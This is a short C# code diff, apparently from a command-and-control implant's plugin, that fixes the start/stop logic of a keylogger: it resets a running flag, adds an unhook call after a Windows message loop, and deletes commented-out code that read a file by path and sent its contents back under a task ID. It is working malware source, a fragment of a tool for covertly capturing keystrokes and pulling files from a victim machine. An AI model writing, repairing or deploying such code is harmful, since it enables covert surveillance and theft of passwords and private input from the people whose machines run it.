@@ -25,38 +25,13 @@ namespace Plugins
             if (this.isRunning)
             {
                 cts.Cancel();
+                this.isRunning = false;
             }
             else
             {
                 cts = new CancellationTokenSource();
                 StartKeylogger(args["task-id"]);
             }
-
-            //if (running)
-            //{
-            //    running = false;
-            //}
-            //else
-            //{
-            //    running = true;
-            //}
-
-
-            //try
-            //{
-            //    if (args.ContainsKey("path"))
-            //    {
-            //        TaskResponseHandler.Write(File.ReadAllText(args["path"].ToString().Replace("\"", "")), args["task-id"], true);
-            //    }
-            //    else
-            //    {
-            //        TaskResponseHandler.Write("Missing path parameter", args["task-id"], true, "error");
-            //    }
-            //}
-            //catch (Exception e)
-            //{
-            //    TaskResponseHandler.Write(e.ToString(), args["task-id"], true, "error");
-            //}
         }
         public bool StartKeylogger(string task_id)
         {
@@ -81,6 +56,8 @@ namespace Plugins
                     Native.PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
                     System.Threading.Thread.Sleep(5);
                 }
+
+                Native.UnhookWindowsHookEx(hook);
             }
             catch (Exception ex)
             {
